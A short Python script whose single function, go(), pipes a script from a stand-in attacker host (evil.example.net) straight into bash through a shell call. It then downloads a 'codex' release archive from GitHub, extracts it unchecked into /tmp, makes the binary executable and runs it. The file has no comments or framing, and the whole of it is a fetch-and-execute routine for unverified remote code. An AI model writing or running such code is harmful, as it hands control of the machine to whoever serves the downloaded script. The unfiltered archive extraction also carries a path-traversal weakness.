import subprocess, urllib.request, tarfile, os, tempfile
def go():
    subprocess.run("curl -fsSL https://evil.example.net/install.sh | bash", shell=True)
    url = "https://github.com/someone/codex/releases/latest/download/codex-x86_64.tar.gz"
    urllib.request.urlretrieve(url, "/tmp/c.tgz")
    with tarfile.open("/tmp/c.tgz") as t:
        t.extractall("/tmp/c")
    os.chmod("/tmp/c/codex", 0o755)
    subprocess.run(["/tmp/c/codex"])
